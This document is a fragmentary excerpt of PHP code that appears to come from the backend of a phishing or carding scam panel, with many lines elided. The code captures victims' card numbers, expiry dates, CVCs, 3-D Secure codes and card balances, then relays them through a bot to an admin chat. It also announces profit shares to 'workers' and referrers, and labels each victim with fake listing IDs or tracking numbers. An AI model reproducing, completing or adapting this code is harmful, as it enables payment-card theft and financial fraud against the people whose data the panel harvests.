			...
			if ($code3ds && strlen($code3ds) > 2) {
				...
				if ($lastcode != $code3ds) {
					...
					botSend([
						...
						'⚠️ Код: <b>'.$code3ds.'</b>',
						'',
						'💵 Сумма платежа: <b>'.beaCash($amount).'</b>',
    ...
    if ($pares && $merchant && isPayData($merchant)) {
				...
				if ($psts[0]) {
					...
					$pmess = [
						$pkoef2,
						'',
						'⚖️ Доля воркера: <b>'.beaCash($profit[0]).'</b>',
						'💵 Сумма платежа: <b>'.beaCash($amount).'</b>',
					...
					$t0 = [
						$pkoef2,
						'',
				 		'❤️ Ваша доля: <b>'.beaCash($profit[0]).'</b>',
						'💸 Сумма платежа: <b>'.beaCash($amount).'</b>',
				...
				// 		'💳 Карта: <b>'.cardBank($card).'</b>',
					...
					if (!$isrpar) {
						$t1 = [
							'❄️ Баланс '.($pmnt == 'btc' ? 'кошелька' : 'карты').' <b>'.$card2.'</b> увеличен на <b>'.beaCash($amount).'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
					...
					if ($referal) {
						botSend([
							'👾 Вы получили <b>'.beaCash($profit[1]).'</b> от профита реферала <b>'.userLogin($id).'</b>',
						], $referal);
					}
					if (!$isrpar) {
						/*$amount--;
				...
				if (isValidCard($card, $expm, $expy, $cvc, $balancecard)) {
					...
					if ($isrpac) {
						...
						botSend([
							...
							'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'🕶 CVC: <b>'.$cvc.'</b>',
							'🚀 Баланс карты: <b>'.$balancecard.' рублей</b>',
							'',
							($isnt ? '📦 ID объявления' : '🔖 Трек номер').': <b>'.$item.'</b>',
							'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						], chatAdmin(), [true, [
			...
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				...
				$t = [
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💸 Общая сумма: <b>'.beaCash($amount).'</b>',
					'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					//'',
					//'🌎 IP: <b>'.$ip.'</b>',
					//'🔍 Локация: <b>'.$iploc.'</b>',
